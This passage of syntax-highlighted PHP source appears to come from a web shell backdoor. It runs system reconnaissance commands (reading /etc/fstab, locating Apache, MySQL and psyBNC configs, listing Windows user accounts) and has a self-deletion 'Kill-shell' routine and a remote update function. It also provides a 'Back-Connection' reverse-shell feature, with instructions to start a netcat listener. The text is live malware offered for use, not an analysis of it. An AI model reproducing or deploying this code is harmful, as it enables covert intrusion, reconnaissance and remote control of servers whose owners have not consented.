        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Distrib Name&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;cat /etc/issue.net&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Distrib Name (2)&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;cat /etc/*-realise&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;CPU Info&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;cat /proc/cpuinfo&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;RAM&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;free -m&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;HDD Space&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;df -h&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;List of Attributes&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;lsattr -a&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Mount Options&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;cat /etc/fstab&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;lynx installed?&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;which lynx&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;links installed?&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;which links&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;GET installed?&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;which GET&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Where is Apache?&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;whereis apache&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Where is perl?&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;whereis perl&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Locate proftpd.conf&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Locate httpd.conf&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Locate my.conf&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;locate my.conf&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Locate psybnc.conf&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">));</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;OS Version&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;ver&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Account Settings&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;net accounts&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;User Accounts&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;net user&quot;</span><span class="p">));</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;mkfile&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$mkfile</span> <span class="o">!=</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$overwrite</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;FILE EXIST:&amp;lt;/b&amp;gt; </span><span class="si">$overwrite</span><span class="s2"> &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;ACCESS DENIED:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span> <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=fxerrmsg&amp;gt;Enter filename!&amp;lt;/div&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;encoder&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;script language=</span><span class="se">\&quot;</span><span class="s2">javascript</span><span class="se">\&quot;</span><span class="s2">&amp;gt;function set_encoder_input(text) {document.forms.encoder.input.value = text;}&amp;lt;/script&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="s2">encoder</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;input type=hidden name=act value=encoder&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;table class=contents&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=4 class=barheader&amp;gt;.: Encoder :.&amp;lt;/td&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=2&amp;gt;Input:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">encoder_input</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">input</span><span class="se">\&quot;</span><span class="s2"> cols=70 rows=5&amp;gt;&quot;</span><span class="o">.@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">calculate</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td rowspan=4&amp;gt;Hashes:&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;md5&quot;</span><span class="p">,</span><span class="s2">&quot;crypt&quot;</span><span class="p">,</span><span class="s2">&quot;sha1&quot;</span><span class="p">,</span><span class="s2">&quot;crc32&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text size=50 onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td rowspan=2&amp;gt;Url:&amp;lt;/td&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;td&amp;gt;urlencode:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text size=35 onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;urldecode:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text size=35 onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td rowspan=2&amp;gt;Base64:&amp;lt;/td&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;td&amp;gt;base64_encode:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text size=35 onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;base64_decode:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$encoder_input</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=text size=35 value=</span><span class="se">\&quot;</span><span class="s2">Failed!</span><span class="se">\&quot;</span><span class="s2"> disabled readonly&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$debase64</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span>
      <span class="nv">$debase64</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&amp;#92;&amp;#48;&quot;</span><span class="p">,</span><span class="s2">&quot;[0]&quot;</span><span class="p">,</span><span class="nv">$debase64</span><span class="p">);</span>
      <span class="nv">$a</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$debase64</span><span class="p">);</span>
      <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
      <span class="nv">$debase64</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$debase64</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=text size=35 onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$debase64</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">debase64</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="nv">$rows</span><span class="o">++</span><span class="p">;</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">40</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">debase64</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$debase64</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">set_encoder_input(document.forms.encoder.debase64.value)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[Send to input]&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Base convertations:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;dec2hex&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text size=35 onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$c</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$hex</span> <span class="o">=</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">];}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;%&quot;</span><span class="o">.</span><span class="nv">$hex</span><span class="p">;}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;fsbuff&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$arr_copy</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">];</span>
      <span class="nv">$arr_cut</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">];</span>
      <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$arr_copy</span><span class="p">,</span><span class="nv">$arr_cut</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$arr</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;h2&amp;gt;&amp;lt;center&amp;gt;Buffer is empty!&amp;lt;/center&amp;gt;&amp;lt;/h2&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$fx_infohead</span> <span class="o">=</span> <span class="s2">&quot;File-System Buffer&quot;</span><span class="p">;</span>
        <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">;</span>
        <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
        <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;selfremove&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span> <span class="o">==</span> <span class="nv">$rndcode</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$submit</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">unlink</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">))</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="s2">&quot;Thanks for using &quot;</span><span class="o">.</span><span class="nv">$sh_name</span><span class="o">.</span><span class="s2">&quot;!&quot;</span><span class="p">;</span> <span class="nx">tpshexit</span><span class="p">();</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Can&#39;t delete &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$rndcode</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error: incorrect confirmation!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
        <span class="nv">$rnd</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=hidden name=act value=selfremove&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=hidden name=rndcode value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rnd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;b&amp;gt;Kill-shell: &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot; &amp;lt;br&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;b&amp;gt;Are you sure? For confirmation, enter </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rnd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;:&amp;nbsp;&amp;lt;input type=text name=submit&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">YES</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;/form&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;update&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">tpsh_getupdate</span><span class="p">(</span><span class="o">!!</span><span class="nv">$confirmupdate</span><span class="p">);</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$ret</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;new version&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=button onclick=</span><span class="se">\&quot;</span><span class="s2">location.href=&#39;&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=update&amp;confirmupdate=1&#39;;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Update now</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
     
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s1">&#39;backc&#39;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">];</span>
     <span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsg&#39;</span><span class="p">];</span>
     <span class="nv">$emsg</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsge&#39;</span><span class="p">];</span>
     <span class="k">echo</span><span class="p">(</span><span class="s1">&#39;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Back-Connection:&amp;lt;/b&amp;gt;&amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;&amp;lt;form name=form method=POST&amp;gt;Host:&amp;lt;input type=text name=backconnectip size=15 value=&#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s1">&#39;&amp;gt; Port: &amp;lt;input type=text name=backconnectport size=15 value=5992&amp;gt; Use: &amp;lt;select size=1 name=use&amp;gt;&amp;lt;option value=Perl&amp;gt;Perl&amp;lt;/option&amp;gt;&amp;lt;option value=C&amp;gt;C&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt; &amp;lt;input type=submit name=submit value=Connect&amp;gt;&amp;lt;/form&amp;gt;First, run NetCat on your computer using \&#39;&amp;lt;b&amp;gt;nc -l -n -v -p &#39;</span><span class="o">.</span><span class="nv">$bc_port</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;\&#39;.  Then, click &quot;Connect&quot; once the port is listening.&amp;lt;/center&amp;gt;&#39;</span><span class="p">);</span>
     <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span>
     <span class="k">echo</span> <span class="nv">$emsg</span><span class="p">;</span>
    <span class="p">}</span>
     
     
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s1">&#39;backd&#39;</span><span class="p">){</span>
